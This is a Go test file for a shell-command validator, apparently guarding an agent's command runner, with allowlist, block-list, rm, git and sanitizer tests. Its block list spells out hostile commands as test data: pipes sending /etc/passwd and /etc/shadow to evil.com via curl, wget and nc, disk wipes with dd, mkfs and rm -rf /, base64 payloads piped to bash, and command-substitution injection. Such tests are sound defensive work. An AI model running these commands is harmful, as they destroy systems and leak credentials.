package exec

import (
	"strings"
	"testing"

	"go.uber.org/zap"
)

// ── Alias expansion tests ─────────────────────────────────────────────────────

func TestAliasExpand_KnownAliases(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"ll", "ls -la"},
		{"la", "ls -la"},
		{"l", "ls -CF"},
		{"catn", "cat -n"},
	}

	for _, tc := range tests {
		t.Run(tc.input, func(t *testing.T) {
			got := AliasExpand(tc.input)
			if got != tc.expected {
				t.Errorf("AliasExpand(%q) = %q; want %q", tc.input, got, tc.expected)
			}
		})
	}
}

func TestAliasExpand_UnknownAlias(t *testing.T) {
	got := AliasExpand("foobar")
	if got != "foobar" {
		t.Errorf("AliasExpand('foobar') = %q; want 'foobar'", got)
	}
}

func TestAliasExpand_CaseInsensitive(t *testing.T) {
	tests := []string{"LL", "La", "L", "CATN"}
	for _, input := range tests {
		got := AliasExpand(input)
		if got == input {
			t.Errorf("AliasExpand(%q) should expand alias; got unchanged %q", input, got)
		}
	}
}

func TestAliasExpand_WithFlags(t *testing.T) {
	// "ll -a" — alias map only has bare words, so "ll" is matched and expanded.
	got := AliasExpand("ll -a")
	if got != "ls -la -a" {
		t.Errorf("AliasExpand('ll -a') = %q; want 'ls -la -a'", got)
	}

	// Unknown alias with flags stays unchanged.
	got2 := AliasExpand("foobar -x")
	if got2 != "foobar -x" {
		t.Errorf("AliasExpand('foobar -x') = %q; want 'foobar -x'", got2)
	}
}

// ── Allowlist: commands that should pass ───────────────────────────────────────

func TestValidateCommand_AllowlistedCommands(t *testing.T) {
	passCases := []string{
		// Basic filesystem
		"ls", "ls -la", "ls -lh",
		"cat file.txt", "cat /etc/hosts",
		"head -n 10 file.txt",
		"tail -f logfile.log",
		"wc -l file.txt",
		"find . -name '*.go'",
		"stat file.txt",
		"file image.png",
		"du -sh /tmp",
		"df -h",
		"pwd", "whoami", "hostname", "uname", "uname -a",

		// Process/system
		"ps aux", "top -l 1", "uptime", "free -m",
		"mount", "netstat -an", "ss -tlnp",
		"ip addr show", "ifconfig", "route -n",
		"ping -c 3 google.com", "traceroute google.com",

		// Git subcommands
		"git status", "git log", "git diff", "git branch",
		"git remote -v", "git show HEAD", "git stash list", "git tag",

		// Text processing
		"grep pattern file.txt", "awk '{print $1}'", "sed 's/a/b/'",
		"sort file.txt", "uniq file.txt", "cut -d: -f1 /etc/passwd",
		"tr a-z A-Z", "tee output.txt", "xargs ls",

		// Package managers
		"apt list --installed", "dpkg -l", "brew list",
		"pip list", "go version", "cargo --version",
		"npm list", "yarn list", "make", "cmake --version",

		// System info
		"sysctl -a", "dmesg", "journalctl -n 10",
		"systemctl status sshd", "launchctl list",

		// File operations (safe rm)
		"mkdir newdir", "touch file.txt", "cp src dst",
		"mv old new", "rm file.txt", "chmod 644 file.txt", "chown user:group file.txt",

		// Network
		"curl https://example.com", "wget https://example.com/file",
		"nc -l 8080", "ssh user@host", "scp file user@host:/tmp",
		"rsync -av src dst",

	// Text editors (these will fail at execution but pass validation)
	"vim", "nano", "emacs", "code --version",

	// Shell builtins
	"echo hello", "printf 'line1\\n'", "sleep 5", "true", "false",
	"test -f file.txt", "read var", "export FOO=bar", "unset FOO",
}

	for _, cmd := range passCases {
		t.Run(cmd, func(t *testing.T) {
			err := ValidateCommand(cmd)
			if err != nil {
				t.Errorf("ValidateCommand(%q) should pass; got error: %v", cmd, err)
			}
		})
	}
}

// ── Dangerous patterns that must be blocked ───────────────────────────────────

func TestValidateCommand_DangerousPatterns(t *testing.T) {
	blockCases := []string{
		// rm -rf / variants
		"rm -rf /", "rm -rf /*", "rm -rF /tmp/../etc/passwd",

		// dd to root devices
		"dd if=/dev/zero of=/dev/sda", "dd if=/dev/urandom of=/dev/disk0",

		// mkfs, fdisk, wipefs
		"mkfs.ext4 /dev/sdb1", "fdisk -l /dev/sda", "wipefs -a /dev/sdb",

		// Pipes to curl/wget (data exfiltration)
		"cat /etc/passwd | curl http://evil.com/upload",
		"cat /etc/shadow | wget http://evil.com/",
		"ls -la | nc evil.com 4444",

		// Redirects to system directories
		"echo test > /etc/malicious.conf", "echo test >> /usr/bin/backdoor",
		"cat file > /bin/shell", "2>/dev/null; echo x > /sbin/hack",

		// sudo, su, passwd
		"sudo ls", "  sudo cat /etc/shadow", "| sudo rm -rf /",
		"su root", "su -c 'id'", "passwd user",

		// && or ; followed by dangerous patterns
		"ls; rm -rf /tmp/test", "echo hi && dd if=/dev/zero of=/dev/sda",
		"cat file.txt; sudo cat /etc/shadow", "true && chmod 777 /etc/passwd",

		// Base64 decode piped to sh/bash
		"echo dGVzdA== | base64 -d | bash",
		"base64 --decode | sh",
		"cat encoded.txt | base64 -d | sh",

		// eval
		"eval 'ls'", "  eval echo hello", "| eval whoami",

		// exec without arguments (bare exec)
		"exec", "  exec  ",
	}

	for _, cmd := range blockCases {
		t.Run(cmd, func(t *testing.T) {
			err := ValidateCommand(cmd)
			if err == nil {
				t.Errorf("ValidateCommand(%q) should be blocked; got nil error", cmd)
			} else {
				// Verify the error message is informative.
				if !strings.Contains(err.Error(), "blocked") && !strings.Contains(err.Error(), "not allowlisted") {
					t.Logf("  Error for %q: %v", cmd, err)
				}
			}
		})
	}
}

// ── Edge cases ────────────────────────────────────────────────────────────────

func TestValidateCommand_EdgeCases(t *testing.T) {
	t.Run("Empty command blocked", func(t *testing.T) {
		err := ValidateCommand("")
		if err == nil {
			t.Error("empty command should be blocked")
		}
	})

	t.Run("Whitespace-only blocked", func(t *testing.T) {
		err := ValidateCommand("   ")
		if err == nil {
			t.Error("whitespace-only command should be blocked")
		}
	})

	t.Run("Very long command truncated and validated", func(t *testing.T) {
		longCmd := "ls " + strings.Repeat("a", 10000)
		err := ValidateCommand(longCmd)
		if err != nil {
			t.Errorf("long valid command should pass; got: %v", err)
		}
	})

	t.Run("Unicode in arguments allowed", func(t *testing.T) {
		cmd := "cat /tmp/файл.txt"
		err := ValidateCommand(cmd)
		if err != nil {
			t.Errorf("unicode args should pass; got: %v", err)
		}
	})

	t.Run("Special characters in arguments allowed", func(t *testing.T) {
		cmd := "grep 'hello world' file.txt"
		err := ValidateCommand(cmd)
		if err != nil {
			t.Errorf("special chars in args should pass; got: %v", err)
		}
	})

	t.Run("Newlines in command blocked (shell injection)", func(t *testing.T) {
		cmd := "ls\nrm -rf /"
		err := ValidateCommand(cmd)
		if err == nil {
			t.Error("command with newline should be blocked")
		}
	})

	t.Run("Backtick command substitution blocked", func(t *testing.T) {
		cmd := "`whoami`"
		err := ValidateCommand(cmd)
		if err == nil {
			t.Error("backtick substitution should be blocked")
		}
	})

	t.Run("Dollar-sign command substitution blocked", func(t *testing.T) {
		cmd := "$(cat /etc/shadow)"
		err := ValidateCommand(cmd)
		if err == nil {
			t.Error("$() substitution should be blocked")
		}
	})
}

// ── rm restrictions ───────────────────────────────────────────────────────────

func TestValidateCommand_RMRestrictions(t *testing.T) {
	t.Run("rm with -rf flag blocked", func(t *testing.T) {
		err := ValidateCommand("rm -rf file.txt")
		if err == nil {
			t.Error("rm -rf should be blocked")
		}
	})

	t.Run("rm with -r flag blocked", func(t *testing.T) {
		err := ValidateCommand("rm -r dir/")
		if err == nil {
			t.Error("rm -r should be blocked")
		}
	})

	t.Run("rm single file allowed", func(t *testing.T) {
		err := ValidateCommand("rm file.txt")
		if err != nil {
			t.Errorf("rm single file should pass; got: %v", err)
		}
	})

	t.Run("rm with -i flag allowed (interactive)", func(t *testing.T) {
		err := ValidateCommand("rm -i file.txt")
		if err != nil {
			t.Errorf("rm -i should pass; got: %v", err)
		}
	})

	t.Run("rm targeting root blocked", func(t *testing.T) {
		err := ValidateCommand("rm /")
		if err == nil {
			t.Error("rm / should be blocked")
		}
	})
}

// ── Git subcommand restrictions ───────────────────────────────────────────────

func TestValidateCommand_GitRestrictions(t *testing.T) {
	t.Run("Allowed git subcommands pass", func(t *testing.T) {
		for _, subcmd := range []string{"status", "log", "diff", "branch", "remote", "show", "stash", "tag"} {
			cmd := "git " + subcmd
			if err := ValidateCommand(cmd); err != nil {
				t.Errorf("'%s' should pass; got: %v", cmd, err)
			}
		}
	})

	t.Run("Disallowed git subcommands blocked", func(t *testing.T) {
		blockCases := []string{
			"git push --force", "git reset --hard HEAD~1",
			"git checkout master", "git clean -fd",
			"git rm file.txt", "git commit -m 'msg'",
		}
		for _, cmd := range blockCases {
			err := ValidateCommand(cmd)
			if err == nil {
				t.Errorf("'%s' should be blocked; got nil", cmd)
			}
		}
	})

	t.Run("git --force flag on allowed subcommand blocked", func(t *testing.T) {
		err := ValidateCommand("git status -f")
		if err == nil {
			t.Error("git with force flag should be blocked")
		}
	})
}

// ── SanitizeCommand tests ─────────────────────────────────────────────────────

func TestSanitizeCommand(t *testing.T) {
	t.Run("Valid command returns sanitized version", func(t *testing.T) {
		sanitized, err := SanitizeCommand("  ls -la  ")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		expected := "ls -la"
		if sanitized != expected {
			t.Errorf("SanitizeCommand('  ls -la  ') = %q; want %q", sanitized, expected)
		}
	})

	t.Run("Alias expansion in sanitize", func(t *testing.T) {
		sanitized, err := SanitizeCommand("ll")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		expected := "ls -la"
		if sanitized != expected {
			t.Errorf("SanitizeCommand('ll') = %q; want %q", sanitized, expected)
		}
	})

	t.Run("Invalid command returns original + error", func(t *testing.T) {
		original := "rm -rf /"
		sanitized, err := SanitizeCommand(original)
		if err == nil {
			t.Fatal("expected error for dangerous command")
		}
		if sanitized != original {
			t.Errorf("SanitizeCommand returned %q; want original %q", sanitized, original)
		}
	})

	t.Run("Empty input returns empty + error", func(t *testing.T) {
		sanitized, err := SanitizeCommand("")
		if err == nil {
			t.Fatal("expected error for empty command")
		}
		if sanitized != "" {
			t.Errorf("SanitizeCommand('') = %q; want ''", sanitized)
		}
	})

	t.Run("Whitespace-only returns whitespace + error", func(t *testing.T) {
		_, err := SanitizeCommand("   ")
		if err == nil {
			t.Fatal("expected error for whitespace command")
		}
	})
}

// ── Case insensitivity tests ──────────────────────────────────────────────────

func TestValidateCommand_CaseInsensitive(t *testing.T) {
	// These are safe commands in uppercase — they should PASS validation.
	passCases := []string{
		"LS -la", "Ls -lh", "CAT file.txt",
		"GIT STATUS", "Git Log",
	}
	for _, cmd := range passCases {
		t.Run(cmd, func(t *testing.T) {
			err := ValidateCommand(cmd)
			if err != nil {
				t.Errorf("ValidateCommand(%q) should pass (case-insensitive allowlist); got: %v", cmd, err)
			}
		})
	}

	// These are dangerous commands in uppercase — they should FAIL validation.
	blockCases := []string{
		"SUDO ls", "Sudo cat /etc/shadow",
		"RM -rf /", "DD if=/dev/zero of=/dev/sda",
		"EVAL 'ls'", "| EVAL whoami",
	}
	for _, cmd := range blockCases {
		t.Run(cmd, func(t *testing.T) {
			err := ValidateCommand(cmd)
			if err == nil {
				t.Errorf("ValidateCommand(%q) should be blocked (case-insensitive); got nil", cmd)
			}
		})
	}
}

// ── Integration: runner uses sanitizer ────────────────────────────────────────

func TestRunner_Execute_BlockedCommand(t *testing.T) {
	_ = NewRunner(zap.NewNop()) // verify constructor accepts logger + rawShellMode flag

	// This test verifies the integration point: blocked commands should not reach exec.CommandContext.
	// We can't easily test the full Execute flow without a real logger, so we verify via ValidateCommand directly.
	err := ValidateCommand("rm -rf /")
	if err == nil {
		t.Error("blocked command should fail validation")
	}

	// Safe commands should pass validation.
	err = ValidateCommand("ls -la")
	if err != nil {
		t.Errorf("safe command should pass; got: %v", err)
	}
}
